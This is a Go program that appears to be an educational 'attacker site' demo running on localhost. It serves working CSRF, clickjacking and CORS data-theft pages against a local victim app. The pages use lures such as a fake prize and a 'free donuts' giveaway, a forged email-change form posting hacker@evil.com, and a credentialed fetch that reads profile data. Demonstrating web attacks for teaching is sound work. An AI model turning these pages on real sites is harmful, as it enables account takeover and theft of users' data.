package main

import (
	"fmt"
	"log/slog"
	"net/http"
	"os"
)

const addr = ":8081"

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/", homeHandler)
	mux.HandleFunc("/csrf", csrfHandler)
	mux.HandleFunc("/clickjacking", clickjackingHandler)
	mux.HandleFunc("/cors", corsHandler)

	slog.Info("attacker site starting", "addr", addr)
	if err := http.ListenAndServe(addr, mux); err != nil {
		slog.Error("server failed", "error", err)
		os.Exit(1)
	}
}

func homeHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, `
		<h1 style="color:red">Attacker Site</h1>
		<ul>
			<li><a href="/csrf">CSRF Attack Page</a></li>
			<li><a href="/clickjacking">Clickjacking Attack Page</a></li>
			<li><a href="/cors">CORS Attack Page</a></li>
		</ul>
		<hr>
		<p><a href="http://localhost:8080">Back to Victim Site</a></p>
	`)
}

func csrfHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `
		<h1 style="color:red">Congratulations! You won a prize!</h1>
		<p>Press the button below to claim your reward!</p>
		<form action="http://localhost:8080/update-email" method="POST">
			<input type="hidden" name="email" value="hacker@evil.com">
			<input type="submit" value="Claim Prize" style="padding:10px 20px; font-size:18px">
		</form>
		<hr>
		<p><a href="/">Back to Attacker Site</a> | <a href="http://localhost:8080">Back to Victim Site</a></p>
	`)
}

func clickjackingHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `
		<style>
			#victim-frame {
				width: 100%%;
				height: 500px;
				position: absolute;
				top: 0;
				left: 0;
				opacity: 0.4; /* Semi-transparent for demo; real attack uses 0.0 */
				z-index: 2;
			}
			#fake-page {
				width: 100%%;
				height: 500px;
				position: absolute;
				top: 0;
				left: 0;
				z-index: 1;
				background: #e0ffe0;
				text-align: center;
				padding-top: 100px;
			}
			.fake-btn {
				margin-top: 105px;
				padding: 25px 50px;
				font-size: 24px;
				background: #44bb44;
				color: white;
				border: none;
				border-radius: 10px;
			}
		</style>
		<div id="fake-page">
			<h1>Free Donuts Giveaway!</h1>
			<p>Press the big button below to get free donuts now!</p>
			<button class="fake-btn">GET DONUTS</button>
		</div>
		<iframe id="victim-frame" src="http://localhost:8080/follow"></iframe>
	`)
}

func corsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `
		<h1 style="color:red">Check your account security!</h1>
		<p>Click the button below to verify your account is safe.</p>
		<button onclick="stealData()" style="padding:10px 20px; font-size:18px">Verify Account</button>
		<pre id="result" style="background:#f0f0f0; padding:15px; margin-top:20px; display:none"></pre>
		<script>
		function stealData() {
			fetch('http://localhost:8080/api/profile', {credentials: 'include'})
				.then(r => r.json())
				.then(data => {
					document.getElementById('result').style.display = 'block';
					document.getElementById('result').textContent =
						'Stolen data from victim site:\n' + JSON.stringify(data, null, 2) +
						'\n\n(In a real attack, this data would be silently sent to the attacker server)';
				})
				.catch(err => {
					document.getElementById('result').style.display = 'block';
					document.getElementById('result').textContent = 'Error: ' + err.message +
						'\n\n(Make sure you are logged in on the victim site)';
				});
		}
		</script>
		<hr>
		<p><a href="/">Back to Attacker Site</a> | <a href="http://localhost:8080">Back to Victim Site</a></p>
	`)
}
